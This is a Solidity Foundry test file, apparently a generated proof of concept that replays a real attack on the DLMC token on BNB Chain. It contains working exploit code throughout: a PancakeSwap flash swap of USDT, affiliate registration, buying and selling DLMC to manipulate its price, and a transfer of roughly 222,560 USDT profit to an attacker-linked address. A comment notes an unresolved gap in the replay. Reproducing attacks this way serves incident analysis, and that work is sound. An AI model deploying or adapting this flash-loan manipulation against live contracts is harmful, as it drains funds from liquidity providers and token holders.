// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./Base.sol";

// @KeyInfo - Total Lost : N/A
// Attacker : 0x74c4a756933d0f713facb1dea325ef511646c3b1
// Attack Contract : 0x4adbddea5781caccadd9f73f00e07201b541414e
// Vulnerable Contract : N/A
// Attack Tx : 0x151025d3f0a782340a74d30ef33a5fad044b838e74437a803f0652e70c231306
// Block : 106091607
// Chain : BSC
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : attacker_profit_reproduction
// Reproduced Value : N/A
//
// @POC Author
// Generated PoC

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_path_entry;
    uint256 constant FORK_BLOCK = 106091606;
    uint256 constant TX_TIMESTAMP = 1782299710;
    uint256 constant TX_BLOCK_NUMBER = 106091607;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);

        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
        vm.setNonce(ATTACK_CONTRACT, 1);

        OurAttack attack = OurAttack(payable(ATTACK_CONTRACT));
        attack._deployAttackChild();

        _prepareProfit(address(attack), address(attack.flashSwapChild()));
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.A_701BB7_9699, address(0), Addresses.USDT, "USDT", 222560221693222099016479);
        _expectProfit(Addresses.created_attack_contract_0A04, attack, Addresses.DLMC, "DLMC", 7651708670942671096055);
    }
}

contract OurAttack {
    BuyHelper public buyHelper;
    FlashSwapChild public flashSwapChild;

    constructor() payable {
        _deployAttackChild();
    }

    function _deployAttackChild() public returns (address) {
        flashSwapChild = new FlashSwapChild();
        require(address(flashSwapChild) == Addresses.created_attack_contract_0A04, "unexpected attack child");
        return address(flashSwapChild);
    }

    function attack() public payable {
        // Unresolved gap: action_0004-action_0006 are observed storage effects with no normal call renderer.
        _decodedCall(
            address(flashSwapChild),
            abi.encodeWithSelector(
                bytes4(0x16521e5a),
                uint256(420000000000000000000000),
                uint256(1000000000000000000000000),
                uint256(0x000000000000000000000000701bb7b460ae231dbbcfa3d87f0ab5b458429699)
            )
        );
    }

    receive() external payable {}

    fallback() external payable {
        if (msg.data.length == 0) return;
    }

    function bindAttackChild(address attackChildAddress) external {
        buyHelper = BuyHelper(payable(attackChildAddress));
    }

    function _decodedCall(address target, bytes memory data) internal {
        (bool ok,) = target.call(data);
        require(ok, "attack child dispatch failed");
    }
}

contract BuyHelper {
    receive() external payable {}

    fallback() external payable {
        if (msg.data.length == 0) return;
        if (msg.sig == 0xa2608d86) {
            _buyWithApproval();
            return;
        }
    }

    function approveProtocolSpenders() external payable {
        _buyWithApproval();
        return;
    }

    function _buyWithApproval() internal {
        IDLMC(Addresses.DLMC).registerAffiliate(Addresses.created_attack_contract_0A04);
        IERC20Like(Addresses.USDT).approve(Addresses.DLMC, type(uint256).max);
        IDLMC(Addresses.DLMC).buy(1000000000000000000000000);
    }
}

contract FlashSwapChild {
    bytes32 private constant REPLAY_CALLBACK_5 = keccak256("poc.replay.REPLAY_CALLBACK_5");

    mapping(bytes32 => bool) private _replayDone;

    receive() external payable {}

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external payable {
        sender;
        amount0;
        amount1;
        data;
        if (!_replayDone[REPLAY_CALLBACK_5]) flashCallback2();
        return;
    }

    fallback() external payable {
        if (msg.data.length == 0) return;
        if (msg.sig == 0x16521e5a) {
            _executeFlashSwap();
            return;
        }
    }

    function flashCallback() external payable {
        if (!_replayDone[REPLAY_CALLBACK_5]) flashCallback2();
        return;
    }

    function _executeFlashSwap() internal {
        IUniswapV2PairLike(Addresses.Cake_LP)
            .swap(
                1420000000000000000000000,
                0,
                Addresses.created_attack_contract_0A04,
                hex"0000000000000000000000000000000000000000000000000000000000000001"
            );
    }

    function flashCallback2() internal {
        _replayDone[REPLAY_CALLBACK_5] = true;
        flashCallback3();
    }

    function flashCallback3() internal {
        IDLMC(Addresses.DLMC).registerAffiliate(Addresses.A_62CEFE_D792);
        IERC20Like(Addresses.USDT).approve(Addresses.DLMC, type(uint256).max);
        IDLMC(Addresses.DLMC).buy(420000000000000000000000);
        BuyHelper buyHelper = new BuyHelper();
        require(address(buyHelper) == Addresses.attack_child, "unexpected attack child");
        IERC20Like(Addresses.USDT).transfer(address(buyHelper), 1000000000000000000000000);
        _decodedCall(
            address(buyHelper),
            abi.encodeWithSelector(
                bytes4(0xa2608d86),
                uint256(0x000000000000000000000000f2ca2a3572b26ae7c479dc7ae36d922113b1bdf2),
                uint256(0x00000000000000000000000055d398326f99059ff775485246999027b3197955),
                uint256(0x000000000000000000000000e81bf6e392eca9ad594b5452ea53cf7071760a04),
                uint256(1000000000000000000000000)
            )
        );
        IDLMC(Addresses.DLMC).livePrice();
        IERC20Like(Addresses.DLMC).balanceOf(address(this));
        IERC20Like(Addresses.USDT).balanceOf(Addresses.DLMC);
        IDLMC(Addresses.DLMC).sell(65908685295332365480640);
        IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP, 1423558897243107769423559);
        uint256 profitTokenBalance = IERC20Like(Addresses.USDT).balanceOf(address(this));
        IERC20Like(Addresses.USDT).transfer(Addresses.A_701BB7_9699, profitTokenBalance);
    }

    function _decodedCall(address target, bytes memory data) internal {
        (bool ok,) = target.call(data);
        require(ok, "attack child dispatch failed");
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant Cake_LP = 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE;
    address internal constant attack_path_entry = 0x4adbDDEA5781cAccADD9F73f00E07201b541414e;
    address internal constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address internal constant A_61E7F1_BCF5 = 0x61e7f1D43567E380ea5B4E7Ac81d6FFEbF1BBCF5;
    address internal constant A_62CEFE_D792 = 0x62cefE76EEcc737D7ee384eFDbAd8D2C53c1d792;
    address internal constant A_701BB7_9699 = 0x701Bb7B460ae231DBBcFA3d87f0aB5B458429699;
    address internal constant attacker_eoa = 0x74c4A756933D0F713FAcB1DeA325eF511646c3B1;
    address internal constant attack_child = 0x8B5A72C4ce0d3a7676ce06B8E42AeB255bBa476e;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address internal constant created_attack_contract_0A04 = 0xE81Bf6E392ECa9aD594B5452ea53cF7071760a04;
    address internal constant DLMC = 0xF2ca2A3572B26Ae7c479dC7ae36D922113B1bdF2;
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
}

interface IDLMC {
    function buy(uint256) external;
    function livePrice() external view returns (uint256);
    function registerAffiliate(address) external;
    function sell(uint256) external;
    function buy() external;
}
